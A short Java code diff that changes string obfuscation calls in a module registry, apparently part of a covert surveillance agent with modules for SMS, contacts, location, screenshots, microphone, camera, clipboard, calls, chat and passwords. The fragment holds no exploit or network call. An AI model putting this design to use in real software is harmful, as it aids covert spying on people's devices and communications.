@@ -23,22 +23,22 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	Hashtable<Class, String> typemap = new Hashtable<Class, String>();
 
 	public FactoryModule() {
-		factorymap.put(M.d("sms"), ModuleMessage.class);
-		factorymap.put(M.d("addressbook"), ModuleAddressBook.class);
-		factorymap.put(M.d("calendar"), ModuleCalendar.class);
-		factorymap.put(M.d("device"), ModuleDevice.class);
-		factorymap.put(M.d("position"), ModulePosition.class);
-		factorymap.put(M.d("screenshot"), ModuleSnapshot.class);
-		factorymap.put(M.d("messages"), ModuleMessage.class);
-		factorymap.put(M.d("mic"), ModuleMic.class);
-		factorymap.put(M.d("camera"), ModuleCamera.class);
-		factorymap.put(M.d("clipboard"), ModuleClipboard.class);
-		factorymap.put(M.d("crisis"), ModuleCrisis.class);
-		factorymap.put(M.d("application"), ModuleApplication.class);
-		factorymap.put(M.d("call"), ModuleCall.class);
-		factorymap.put(M.d("chat"), ModuleChat.class);
+		factorymap.put(M.e("sms"), ModuleMessage.class);
+		factorymap.put(M.e("addressbook"), ModuleAddressBook.class);
+		factorymap.put(M.e("calendar"), ModuleCalendar.class);
+		factorymap.put(M.e("device"), ModuleDevice.class);
+		factorymap.put(M.e("position"), ModulePosition.class);
+		factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
+		factorymap.put(M.e("messages"), ModuleMessage.class);
+		factorymap.put(M.e("mic"), ModuleMic.class);
+		factorymap.put(M.e("camera"), ModuleCamera.class);
+		factorymap.put(M.e("clipboard"), ModuleClipboard.class);
+		factorymap.put(M.e("crisis"), ModuleCrisis.class);
+		factorymap.put(M.e("application"), ModuleApplication.class);
+		factorymap.put(M.e("call"), ModuleCall.class);
+		factorymap.put(M.e("chat"), ModuleChat.class);
 		if (Cfg.ENABLE_PASSWORD_MODULE) {
-			factorymap.put(M.d("password"), ModulePassword.class);
+			factorymap.put(M.e("password"), ModulePassword.class);
 		}
 
 		Enumeration<String> en = factorymap.keys();
